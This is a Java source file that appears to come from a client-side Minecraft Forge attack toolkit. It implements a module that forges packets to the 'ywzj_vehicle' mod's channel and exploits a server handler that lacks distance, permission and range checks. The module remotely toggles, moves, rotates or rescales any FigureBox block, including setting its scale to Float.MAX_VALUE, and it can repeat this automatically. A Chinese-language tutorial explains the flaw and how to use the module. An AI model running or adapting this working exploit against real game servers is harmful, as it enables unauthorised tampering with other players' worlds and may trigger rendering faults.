package com.redblue.red.modules.limitlessvehicle;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LV-04 (CONFIRMED): Remote FigureBoxBlockEntity manipulation.
 *
 * Handler lambda$onClientMessageReceived$0 verified via javap:
 * - Gets sender, null-checks, then level.getBlockEntity(msg.blockPos)
 * - NO distance check between sender and blockPos
 * - NO permission check
 * - NO GUI-open check
 * - Directly writes all fields: open, scale, xShift, yShift, zShift, xRot, yRot
 * - NO range validation on scale/shift/rot values
 * - Calls setChanged() + level.setBlock() with OPEN property
 *
 * Wire format (index 112):
 *   writeByte(112)
 *   writeBlockPos(blockPos)     // m_130064_ = writeLong(pos.asLong())
 *   writeBoolean(open)
 *   writeFloat(scale)
 *   writeFloat(xShift)
 *   writeFloat(yShift)
 *   writeFloat(zShift)
 *   writeFloat(xRot)
 *   writeFloat(yRot)
 */
public class LV03_FigureBoxManip implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ywzj_vehicle", "ywzj_vehicle_channel");
    private static final int IDX_FIGURE_BOX = 112;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "操作模式", "TOGGLE", "TOGGLE", "SCALE_ABUSE", "CUSTOM"),
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                BlockPos pos = mc.player.blockPosition();
                getParam("block_pos").ifPresent(p ->
                    p.set(pos.getX() + "," + pos.getY() + "," + pos.getZ()));
            }
        }),
        ConfigParam.ofString("block_pos", "目标方块坐标(x,y,z)", "0,64,0"),
        ConfigParam.ofBool("open", "打开/关闭", true)
                .visibleWhen("mode", "TOGGLE", "CUSTOM"),
        ConfigParam.ofFloat("scale", "缩放值", 1f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofFloat("x_shift", "X偏移", 0f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofFloat("y_shift", "Y偏移", 0f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofFloat("z_shift", "Z偏移", 0f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofFloat("x_rot", "X旋转", 0f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofFloat("y_rot", "Y旋转", 0f, -3.4e38f, 3.4e38f)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "lv03_figurebox_manip"; }
    @Override public String name() { return "展示盒操控"; }
    @Override public String description() { return "远程操控任意FigureBox: 开关/缩放/位移/旋转，无距离限制"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 输入目标FigureBox方块坐标或点击「填充当前坐标」\n"
            + "2. 选择操作模式:\n"
            + "   TOGGLE - 远程打开/关闭展示盒\n"
            + "   SCALE_ABUSE - 设置极端缩放值(可能导致渲染异常)\n"
            + "   CUSTOM - 自定义所有参数\n"
            + "3. 点击执行\n\n"
            + "[漏洞原理]\n"
            + "LV-04: handler无距离校验，blockPos可为任意坐标\n"
            + "scale/shift/rot无范围校验，可设为Float.MAX_VALUE";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ywzj_vehicle");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doManip(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doManip(mc);
    }

    private void doManip(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("TOGGLE");
        long blockPosLong = parseBlockPos(
            getParam("block_pos").map(ConfigParam::getString).orElse("0,64,0"));

        switch (mode) {
            case "TOGGLE" -> sendFigureBox(blockPosLong,
                getParam("open").map(ConfigParam::getBool).orElse(true),
                1f, 0f, 0f, 0f, 0f, 0f);
            case "SCALE_ABUSE" -> sendFigureBox(blockPosLong,
                true, Float.MAX_VALUE, 0f, 0f, 0f, 0f, 0f);
            case "CUSTOM" -> sendFigureBox(blockPosLong,
                getParam("open").map(ConfigParam::getBool).orElse(true),
                getParam("scale").map(ConfigParam::getFloat).orElse(1f),
                getParam("x_shift").map(ConfigParam::getFloat).orElse(0f),
                getParam("y_shift").map(ConfigParam::getFloat).orElse(0f),
                getParam("z_shift").map(ConfigParam::getFloat).orElse(0f),
                getParam("x_rot").map(ConfigParam::getFloat).orElse(0f),
                getParam("y_rot").map(ConfigParam::getFloat).orElse(0f));
        }
    }

    private void sendFigureBox(long blockPosLong, boolean open,
            float scale, float xShift, float yShift, float zShift,
            float xRot, float yRot) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_FIGURE_BOX);
            buf.writeLong(blockPosLong);   // writeBlockPos = writeLong
            buf.writeBoolean(open);
            buf.writeFloat(scale);
            buf.writeFloat(xShift);
            buf.writeFloat(yShift);
            buf.writeFloat(zShift);
            buf.writeFloat(xRot);
            buf.writeFloat(yRot);
        });
    }

    private long parseBlockPos(String posStr) {
        try {
            String[] parts = posStr.split(",");
            int x = Integer.parseInt(parts[0].trim());
            int y = Integer.parseInt(parts[1].trim());
            int z = Integer.parseInt(parts[2].trim());
            return BlockPos.asLong(x, y, z);
        } catch (Exception e) {
            return BlockPos.asLong(0, 64, 0);
        }
    }
}
